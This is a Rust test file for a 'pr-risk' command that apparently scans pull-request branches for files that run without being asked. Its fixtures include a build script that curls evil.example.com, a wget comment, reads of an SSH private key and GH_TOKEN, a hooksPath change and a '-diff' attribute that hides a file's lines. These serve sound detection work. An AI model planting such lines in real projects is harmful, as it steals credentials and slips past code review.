//! `switchboard pr-risk`, ported from test/pr-risk.test.js: a throwaway
//! repository in a temporary home whose branch changes files of every kind,
//! some that run without being asked and some that don't, read back as the
//! file list, the JSON and the report. Its git runs with no config of
//! yours, and nothing reaches a service.

use crate::common;

use std::fs;
use std::path::Path;
use std::process::{Command, Output, Stdio};

use common::{BIN, TempDir};
use serde_json::Value;

fn env(cmd: &mut Command, home: &Path) {
    cmd.env("HOME", home)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@e")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@e")
        .env_remove("SWITCHBOARD")
        .env_remove("SWITCHBOARD_PANE")
        .stdin(Stdio::null());
}

fn git(home: &Path, args: &[&str]) {
    let mut cmd = Command::new("git");
    cmd.arg("-C").arg(home.join("repo")).args(args);
    env(&mut cmd, home);
    let out = cmd.output().unwrap();
    assert!(out.status.success(), "git {args:?}: {out:?}");
}

fn write(home: &Path, file: &str, text: &str) {
    let path = home.join("repo").join(file);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, text).unwrap();
}

fn risk(home: &Path, args: &[&str]) -> Output {
    let mut cmd = Command::new(BIN);
    cmd.arg("pr-risk").args(args);
    env(&mut cmd, home);
    cmd.output().unwrap()
}

fn ok(out: Output) -> String {
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).into_owned()
}

#[test]
fn it_lists_each_file_that_runs_unasked_the_added_lines_to_read_first_and_the_new_hosts() {
    let tmp = TempDir::new("pr-risk");
    let home = tmp.path();
    fs::create_dir(home.join("repo")).unwrap();
    git(home, &["init", "-q"]);
    git(home, &["symbolic-ref", "HEAD", "refs/heads/main"]);
    write(home, "README.md", "See https://github.com/o/r\n");
    write(home, "src/main.rs", "fn main() {}\n");
    write(home, "Cargo.toml", "[package]\nname = \"x\"\n");
    git(home, &["add", "."]);
    git(home, &["commit", "-q", "-m", "base"]);
    git(home, &["checkout", "-q", "-b", "pr"]);
    write(home, "install.sh", "echo install\n");
    write(home, ".githooks/pre-push", "echo hook\n");
    write(home, ".claude/settings.json", "{}\n");
    write(home, "assets/skills/x/SKILL.md", "# x\n");
    write(
        home,
        "build.rs",
        "fn main() {\n    std::process::Command::new(\"curl\").arg(\"https://evil.example.com/x\");\n}\n",
    );
    write(
        home,
        "Cargo.toml",
        "[package]\nname = \"x\"\n[dependencies]\nleft-pad = \"1\"\n",
    );
    write(home, "web/package-lock.json", "{}\n");
    write(
        home,
        "src/setup/thing.rs",
        "let k = std::fs::read(home.join(\".ssh/id_ed25519\"));\n",
    );
    write(
        home,
        "src/main.rs",
        "fn main() {\n    // github.com is named in the base\n    let u = \"https://github.com/o/r\";\n}\n",
    );
    write(home, "docs.md", "eval is a word here too\n");
    // A -diff attribute, which would show src/b.rs as binary and hide its lines.
    write(home, ".gitattributes", "src/b.rs -diff\n");
    write(home, "src/b.rs", "// wget https://evil.example.com/y\n");
    // A line beginning ++, which the diff shows as +++ inside a hunk.
    write(
        home,
        "src/c.rs",
        "let mut n = 0;\n++n;\nlet t = std::env::var(\"GH_TOKEN\");\n",
    );
    write(home, "src/d.rs", "// git config core.hooksPath .hooks\n");
    git(home, &["add", "."]);
    git(home, &["commit", "-q", "-m", "pr"]);
    let repo = home.join("repo");
    let repo = repo.to_str().unwrap();

    let files = ok(risk(home, &["--files", repo, "main"]));
    let mut listed: Vec<String> = files
        .lines()
        .map(|l| l.split_whitespace().collect::<Vec<_>>().join(" "))
        .collect();
    listed.sort();
    assert_eq!(
        listed,
        [
            "build A build.rs",
            "build M Cargo.toml",
            "claude A .claude/settings.json",
            "claude A assets/skills/x/SKILL.md",
            "git A .gitattributes",
            "git A .githooks/pre-push",
            "packages A web/package-lock.json",
            "setup A install.sh",
            "setup A src/setup/thing.rs",
        ],
        "the code alone and the docs aren't listed"
    );

    let report: Value = serde_json::from_str(&ok(risk(home, &["--json", repo, "main"]))).unwrap();
    let mut hits: Vec<String> = report["hits"]
        .as_array()
        .unwrap()
        .iter()
        .map(|h| {
            format!(
                "{}:{} {}",
                h["file"].as_str().unwrap(),
                h["line"],
                h["what"].as_str().unwrap()
            )
        })
        .collect();
    hits.sort();
    assert_eq!(
        hits,
        [
            "build.rs:2 fetches",
            "docs.md:1 evaluates",
            "src/b.rs:1 fetches",
            "src/c.rs:3 reaches for credentials",
            "src/d.rs:1 changes what git runs",
            "src/setup/thing.rs:1 reaches for SSH keys",
        ]
    );
    assert_eq!(
        report["hosts"],
        serde_json::json!(["evil.example.com"]),
        "github.com is named in the base already"
    );
    let cargo = report["files"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["path"] == "Cargo.toml")
        .unwrap();
    assert_eq!(
        cargo["added"],
        serde_json::json!([
            { "line": 3, "text": "[dependencies]" },
            { "line": 4, "text": "left-pad = \"1\"" },
        ])
    );
    assert_eq!(report["mergeBase"].as_str().unwrap().len(), 40);

    let text = ok(risk(home, &[repo, "main"]));
    assert!(
        text.contains("## Run or read by git in the worktree (hooks, filters, submodules)\n\nA .gitattributes (+1)\n      1  src/b.rs -diff\nA .githooks/pre-push (+1)\n      1  echo hook"),
        "{text}"
    );
    assert!(
        text.contains("## Hosts the base names nowhere\n\nevil.example.com"),
        "{text}"
    );

    // Nothing that runs unasked, nothing flagged.
    git(home, &["checkout", "-q", "main"]);
    git(home, &["checkout", "-q", "-b", "plain"]);
    write(home, "src/main.rs", "fn main() { println!(\"hi\"); }\n");
    git(home, &["commit", "-q", "-am", "plain"]);
    let plain = ok(risk(home, &[repo, "main"]));
    assert!(
        plain.starts_with("Nothing that runs without being asked changed"),
        "{plain}"
    );

    let usage = risk(home, &[repo]);
    assert_eq!(usage.status.code(), Some(2));
    let bad = risk(home, &[repo, "--no-such"]);
    assert_eq!(bad.status.code(), Some(2));
    let missing = risk(home, &[repo, "nowhere"]);
    assert_eq!(missing.status.code(), Some(1));
}
